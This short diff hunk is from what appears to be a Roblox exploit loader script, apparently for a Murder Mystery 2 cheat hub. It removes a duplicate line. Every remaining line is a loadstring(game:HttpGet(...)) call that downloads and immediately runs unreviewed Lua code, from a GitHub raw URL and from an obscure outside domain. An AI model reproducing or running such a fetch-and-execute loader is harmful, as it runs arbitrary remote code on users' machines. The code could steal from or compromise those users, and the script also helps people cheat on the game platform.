@@ -5,6 +5,5 @@ for _, url in pairs({
     "https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"
 }) do
     loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()
-    loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()
     loadstring(game:HttpGet(url, true))()
 end
